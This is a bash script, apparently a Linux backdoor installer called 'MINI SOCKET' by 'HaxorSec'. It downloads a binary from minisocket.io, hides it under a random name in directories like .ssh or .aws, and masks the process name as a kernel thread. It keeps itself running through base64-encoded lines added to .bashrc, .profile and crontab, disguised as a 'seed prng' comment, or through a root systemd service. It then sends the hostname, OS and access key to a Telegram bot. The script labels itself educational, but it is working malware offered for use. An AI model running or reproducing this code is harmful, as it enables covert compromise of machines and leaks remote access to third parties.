#!/usr/bin/env bash
# Version V1.0-Unstable
[[ -t 1 ]] && {
        Y="\033[1;33m" # yellow
        G="\033[1;32m" # green
        R="\033[1;31m" # red
        DR="\033[0;31m" # red
        C="\033[1;36m" # cyan
        M="\033[1;35m" # magenta
        N="\033[0m"    # none
        W="\033[1;37m"
}
echo -e "${Y}====================================================================================================
${G}MINI SOCKET

Disclaimer
This script is for educational purposes only.
Malicious usage of this script will not hold the author responsible.
Do not pentest without explicit permissions.
${Y}====================================================================================================
"

# Set $HOME to the directory where the script is located
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
if [[ -z "$HOME" ]]; then
    HOME="$SCRIPT_DIR"
fi

URL_BASE="https://minisocket.io"
URL_BD="${URL_BASE}/bin/"
URL_FULL="${URL_BD}"
TEMPDIR="/tmp/mini-socket"
SOCKETDIR="socket.php"

# Array untuk menyimpan direktori yang sudah digunakan
used_dirs=()

# Fungsi untuk mendapatkan domain
get_domain() {
    hostname -d 2>/dev/null || echo "N/A"
}

clean_all(){
    rm -rf ${TEMPDIR}
    rm -rf ${SOCKETDIR}
    rm -rf ${HISTOR}
}

# GCC
errgcc(){
    echo -e "${R}ERROR:${C} gcc command not found.${N} Try Manual"
    clean_all
    exit
}

# INIT
errexit()
{
   echo -e "${R}ERROR:${C} \$HOME not set.${N} Try 'export HOME=<users home directory>'"
   clean_all
   exit
}

init_vars()
{
        if [[ -z "$HOME" ]]; then
                HOME="$(grep ^"$(whoami)" /etc/passwd | cut -d: -f6)"
                [[ ! -d "$HOME" ]] && errexit
                echo "HOME not set. Using 'HOME=$HOME'"
        fi
}
if [ -n "$MINI_PORT" ]; then
    MINI_PORT_LINE="MINI_PORT=${MINI_PORT}"
else
    MINI_PORT_LINE=""
fi
bashrc_ok="${C}[+]${Y} Installing access Via .bashrc.................${N}[${G}OK${N}]"
profile_ok="${C}[+]${Y} Installing access Via .profile................${N}[${G}OK${N}]"
crontab_ok="${C}[+]${Y} Installing access Via .crontab................${N}[${G}OK${N}]"
systemd_ok="${C}[+]${Y} Installing systemd service....................${N}[${G}OK${N}]"
bashrc_fail="${C}[-]${Y} Installing access Via .bashrc.............${N}[${DR}FAILED${N}]"
profile_fail="${C}[-]${Y} Installing access Via .profile............${N}[${DR}FAILED${N}]"
crontab_fail="${C}[-]${Y} Installing access Via .crontab............${N}[${DR}FAILED${N}]"
systemd_fail="${C}[-]${Y} Installing systemd service...............${N}[${DR}FAILED${N}]"

bashrc() {
    # Check if .bashrc exists
    if [[ ! -f "$HOME/.bashrc" ]]; then
        touch "$HOME/.bashrc" || {
            echo -e "${R}ERROR:${N} Failed to create .bashrc in $HOME, trying $SCRIPT_DIR"
            HOME="$SCRIPT_DIR"
            touch "$HOME/.bashrc" || {
                echo -e "${R}FATAL:${N} Could not create .bashrc in either location"
                return 1
            }
        }
    fi

    # Check if the entry already exists
    if ! grep -q "${BIN_HIDDEN_NAME_DEFAULT}-kernel" "$HOME/.bashrc"; then
        echo "{ echo ${b64}|base64 -d|bash;} 2>/dev/null  #1b5b324a50524e47 >/dev/random # seed prng ${BIN_HIDDEN_NAME_DEFAULT}-kernel" >> "$HOME/.bashrc"
    fi

    # Verify the installation
    if grep -q "${BIN_HIDDEN_NAME_DEFAULT}" "$HOME/.bashrc"; then
        echo -e "${bashrc_ok}"
    else
        echo -e "${bashrc_fail}"
    fi
    source "$HOME/.bashrc"
}

profile() {
    # Check if .profile exists
    if [[ ! -f "$HOME/.profile" ]]; then
        touch "$HOME/.profile" || {
            echo -e "${R}ERROR:${N} Failed to create .profile in $HOME, trying $SCRIPT_DIR"
            HOME="$SCRIPT_DIR"
            touch "$HOME/.profile" || {
                echo -e "${R}FATAL:${N} Could not create .profile in either location"
                return 1
            }
        }
    fi

    # Check if the entry already exists
    if ! grep -q "${BIN_HIDDEN_NAME_DEFAULT}-kernel" "$HOME/.profile"; then
        echo "{ echo ${b64}|base64 -d|bash;} 2>/dev/null  #1b5b324a50524e47 >/dev/random # seed prng ${BIN_HIDDEN_NAME_DEFAULT}-kernel" >> "$HOME/.profile"
    fi

    # Verify the installation
    if grep -q "${BIN_HIDDEN_NAME_DEFAULT}" "$HOME/.profile"; then
        echo -e "${profile_ok}"
    else
        echo -e "${profile_fail}"
    fi
}

cron(){
    key=$(cat $HOME/${RANDOM_DIR}/${BIN_HIDDEN_NAME_DEFAULT}/${BIN_HIDDEN_NAME_DEFAULTDAT})
    if [[ $(crontab -l | grep -oP "${BIN_HIDDEN_NAME_DEFAULT}") =~ "${BIN_HIDDEN_NAME_DEFAULT}" ]]; then
        echo -e ${crontab_ok}
    else
        echo -e ${crontab_fail}
    fi

    msg="[HaxorSec MINI-SOCKET]
Hostname: $(hostname)
OS: $(uname -rom)
Domain: $(get_domain)
Access: mini-nc -s ${key}"
TELEGRAM_BOT_TOKEN="123456789:xxxx"  # Ganti dengan token bot kamu
TELEGRAM_CHAT_ID="xxx5555x"  # Ganti dengan chat ID kamu (user atau grup)
urlencode() {
    local length="${#1}"
    for (( i = 0; i < length; i++ )); do
        local c="${1:i:1}"
        case $c in
            [a-zA-Z0-9.~_-]) printf "$c" ;;
            *) printf '%%%02X' "'$c" ;;
        esac
    done
}
# === Encode pesan ===
encoded_msg=$(urlencode "$msg")
url="https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encoded_msg}&parse_mode=Markdown"

# === Kirim menggunakan wget atau curl ===
if command -v wget >/dev/null; then
    echo -e "${C}[+]${Y} ACCESS : ${G}mini-nc -s \"${key}\"${N}"
    wget -qO- "$url" >/dev/null
elif command -v curl >/dev/null; then
    echo -e "${C}[+]${Y} ACCESS : ${G}mini-nc -s \"${key}\"${N}"
    curl -s "$url" >/dev/null
else
    echo -e "${C}[!]${Y} wget atau curl tidak tersedia.${N}"
    exit 1
fi
}

handle_error() {
    echo -e "${R}ERROR:${N} $1"
    clean_all
    exit 1
}

root_install() {
    echo -e "${C}[+]${Y} Performing root installation................${N}"

    # Create systemd service
    cat > "/etc/systemd/system/${BIN_HIDDEN_NAME_DEFAULT}.service" <<EOF
[Unit]
Description=${BIN_HIDDEN_NAME_DEFAULT} Service
After=network.target

[Service]
Type=simple
Restart=always
RestartSec=30
User=root
WorkingDirectory=/root
ExecStart=/bin/bash -c "${MINI_PORT_LINE} MINI_ARGS='-k /lib/${BIN_HIDDEN_NAME_DEFAULT}.dat' exec -a '[${BIN_HIDDEN_NAME_DEFAULT}]' '/usr/bin/${BIN_HIDDEN_NAME_DEFAULT}'"
ExecReload=/bin/kill -HUP \$MAINPID
KillMode=process
OOMScoreAdjust=-1000

[Install]
WantedBy=multi-user.target
EOF

    # Install binary
    mv "${TEMPDIR}" "/usr/bin/${BIN_HIDDEN_NAME_DEFAULT}" || handle_error "Failed to move binary"
    chmod +x "/usr/bin/${BIN_HIDDEN_NAME_DEFAULT}" || handle_error "Failed to make binary executable"

    # Generate key
    SECRET=$(${BIN_HIDDEN_NAME_DEFAULT} -g)
    echo "$SECRET" > "/lib/${BIN_HIDDEN_NAME_DEFAULT}.dat" || handle_error "Failed to create key file"
    chmod 600 "/lib/${BIN_HIDDEN_NAME_DEFAULT}.dat" || handle_error "Failed to set key file permissions"

    # Start service
    systemctl daemon-reload || handle_error "Failed to reload systemd"
    systemctl enable "${BIN_HIDDEN_NAME_DEFAULT}.service" || handle_error "Failed to enable service"
    systemctl start "${BIN_HIDDEN_NAME_DEFAULT}.service" || echo -e "${Y}[WARNING]${N} Failed to start service (may already be running)" >&2


    # Notify server
    msg="[HaxorSec MINI-SOCKET Root Install]
Hostname: $(hostname)
OS: $(uname -rom)
Domain: $(get_domain)
Access: mini-nc -s ${SECRET}"
TELEGRAM_BOT_TOKEN="123456789:xxxx"  # Ganti dengan token bot kamu
TELEGRAM_CHAT_ID="xxx5555x"  # Ganti dengan chat ID kamu (user atau grup)
urlencode() {
    local length="${#1}"
    for (( i = 0; i < length; i++ )); do
        local c="${1:i:1}"
        case $c in
            [a-zA-Z0-9.~_-]) printf "$c" ;;
            *) printf '%%%02X' "'$c" ;;
        esac
    done
}
# === Encode pesan ===
encoded_msg=$(urlencode "$msg")
url="https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encoded_msg}&parse_mode=Markdown"

# === Kirim menggunakan wget atau curl ===
if command -v wget >/dev/null; then
    echo -e "${C}[+]${Y} ACCESS : ${G}mini-nc -s \"${key}\"${N}"
    wget -qO- "$url" >/dev/null
elif command -v curl >/dev/null; then
    echo -e "${C}[+]${Y} ACCESS : ${G}mini-nc -s \"${key}\"${N}"
    curl -s "$url" >/dev/null
else
    echo -e "${C}[!]${Y} wget atau curl tidak tersedia.${N}"
    exit 1
fi

    echo -e "${G}[+] Root installation completed successfully!${N}"
    echo -e "${C}[+]${Y} ACCESS : ${G}mini-nc -s \"${SECRET}\"${N}"
}

user_install() {
    echo -e "${C}[+]${Y} Performing user installation................${N}"
    init_vars
    echo -e "${C}[+]${Y} CHECKING INIT HOME DESTINATION................${N}[${G}OK${N}]"
    sleep 2
    
    # Try to create directory in HOME first, fallback to SCRIPT_DIR if permission denied
    TARGET_DIR="$HOME/${RANDOM_DIR}/${BIN_HIDDEN_NAME_DEFAULT}"
    mkdir -p "$TARGET_DIR" 2>/dev/null || {
        echo -e "${Y}[WARNING]${N} Permission denied in $HOME, falling back to script directory"
        TARGET_DIR="$SCRIPT_DIR/${RANDOM_DIR}/${BIN_HIDDEN_NAME_DEFAULT}"
        mkdir -p "$TARGET_DIR" || {
            echo -e "${R}ERROR:${N} Could not create directory in either location"
            return 1
        }
    }
    
    echo -e "${C}[+]${Y} Moving To Init................................${N}[${G}OK${N}]"
    mv "${TEMPDIR}" "${TARGET_DIR}/${BIN_HIDDEN_NAME_DEFAULT}" || {
        echo -e "${R}ERROR:${N} Failed to move binary"
        return 1
    }

    if command -v base64 >/dev/null 2>&1; then
       echo -e "${C}[+]${Y} Encrypted backdoor execution..................${N}[${G}OK${N}]"
        BIN="${TARGET_DIR}/${BIN_HIDDEN_NAME_DEFAULT}"
        chmod +x "${BIN}"
        "${BIN}" -g > "${TARGET_DIR}/${BIN_HIDDEN_NAME_DEFAULTDAT}"
        
        STEALTH_CMD=$(cat <<EOF
/usr/bin/pkill -0 -U$(id -u) ${BIN_HIDDEN_NAME_DEFAULT} 2>/dev/null || \
SHELL="/bin/bash" \
TERM=xterm-256color \
PATH="/usr/local/bin:/usr/bin:/bin:/usr/games" \
${MINI_PORT_LINE} \
MINI_ARGS="-k ${TARGET_DIR}/${BIN_HIDDEN_NAME_DEFAULTDAT} --daemon" \
exec -a "[${BIN_HIDDEN_NAME_DEFAULT}]" \
"${BIN}" \
> /dev/null 2>&1
EOF
)

        b64=$(echo "${STEALTH_CMD}" | base64 -w 0 | tr -d "\n")

        bashrc
        profile
        echo "0 * * * * { echo ${b64}|base64 -d|bash;} 2>/dev/null  #1b5b324a50524e47 >/dev/random # seed prng ${BIN_HIDDEN_NAME_DEFAULT}-kernel" | crontab
        cron
    else
        echo -e "${C}[-]${DR} FAILED.......................................${N}"
        rm -rf "${TARGET_DIR}"
    fi
    clean_all
}



# FUNCTION DOWNLOAD
dl()
{
 # Pastikan variabel sumber dan URL sudah ditentukan lebih awal
sources="mini-socket"
URL_FULL_FINAL="${URL_FULL}/${sources}"

# Periksa ketersediaan wget
if command -v wget >/dev/null 2>&1; then
    wget --no-check-certificate -q "${URL_FULL_FINAL}" -O "${TEMPDIR}"
    if [ -s "${TEMPDIR}" ]; then
        echo -e "${C}[+]${Y} Downloading via wget..........................${N}[${G}OK${N}]"
        if [ "$(id -u)" -eq 0 ]; then
            root_install
        else
            user_install
        fi
    else
        echo -e "${C}[+]${Y} Downloading via wget..........................${N}[${DR}FAILED${N}]"
    fi

# Jika wget tidak ada, cek curl
elif command -v curl >/dev/null 2>&1; then
    curl -s -k -L "${URL_FULL_FINAL}" -o "${TEMPDIR}"
    if [ -s "${TEMPDIR}" ]; then
        echo -e "${C}[+]${Y} Downloading via curl..........................${N}[${G}OK${N}]"
        if [ "$(id -u)" -eq 0 ]; then
            root_install
        else
            user_install
        fi
    else
        echo -e "${C}[+]${Y} Downloading via curl..........................${N}[${DR}FAILED${N}]"
    fi

# Tidak ada wget atau curl
else
    echo -e "${C}[-]${DR}Cannot download, neither wget nor curl is available.${N}"
fi

}

# Function to get a random directory name from common Linux system directories
get_random_dir() {
    local common_dirs=(
        ".aws" ".ssh" ".config" ".cache" ".local" ".kube" ".docker" ".ansible" ".npm" ".composer"
        ".gnupg" ".mozilla" ".vscode" ".vim" ".terraform" ".jenkins" ".git" ".azure" ".pki" ".cagefs"
        ".yarn" ".pip" ".vagrant.d" ".rpmdb" ".gem" ".ivy2" ".m2" ".gradle" ".bundler" ".cargo"
        ".nuget" ".terraform.d" ".serverless" ".kibana" ".elasticsearch" ".postgresql" ".mysql"
        ".mongodb" ".redis" ".nginx" ".apache2" ".letsencrypt" ".certbot" ".acme.sh" ".travis"
        ".circleci" ".github" ".gitlab" ".drone" ".sonar" ".prometheus" ".grafana" ".zabbix" ".nagios"
        ".puppet" ".chef" ".salt" ".consul" ".vault" ".nomad" ".istio" ".kiali" ".jaeger" ".fluentd"
        ".logstash" ".filebeat" ".metricbeat" ".packetbeat" ".heartbeat" ".auditbeat" ".journalbeat"
        ".functionbeat"
    )

    # Filter out directories that have already been used
    local available_dirs=()
    for dir in "${common_dirs[@]}"; do
        if [[ ! " ${used_dirs[@]} " =~ " ${dir} " ]]; then
            available_dirs+=("$dir")
        fi
    done

    # If no available directories left, return an error
    if [[ ${#available_dirs[@]} -eq 0 ]]; then
        echo -e "${R}ERROR:${C} No available directories left.${N}"
        exit 1
    fi

    # Select a random directory from the available directories
    local random_dir=${available_dirs[$RANDOM % ${#available_dirs[@]}]}

    # Add the selected directory to the used_dirs array
    used_dirs+=("$random_dir")

    echo "$random_dir"
}

# Function to get a random binary name from the provided URL
get_random_bin_name() {
    # Download the list of names from the URL
    local wordlist_url="https://minisocket.io/bin/wordlist.txt"
    local wordlist=$(curl -s "$wordlist_url")

    # Clean the list: remove symbols, convert to lowercase, and filter out empty lines
    local cleaned_list=$(echo "$wordlist" | tr -cd '[:alnum:]\n' | tr '[:upper:]' '[:lower:]' | sed '/^$/d')

    # Convert the cleaned list into an array
    local bin_names=($cleaned_list)

    # Select a random binary name from the list
    local random_bin_name=${bin_names[$RANDOM % ${#bin_names[@]}]}

    echo "$random_bin_name"
}

# Set RANDOM_DIR to a random directory name
RANDOM_DIR=$(get_random_dir)

# Set BIN_HIDDEN_NAME_DEFAULT to a random binary name
BIN_HIDDEN_NAME_DEFAULT=$(get_random_bin_name)
BIN_HIDDEN_NAME_DEFAULTDAT="${BIN_HIDDEN_NAME_DEFAULT}.dat"
PROC_HIDDEN_NAME_DEFAULT="[${BIN_HIDDEN_NAME_DEFAULT}]"

# Main execution
dl
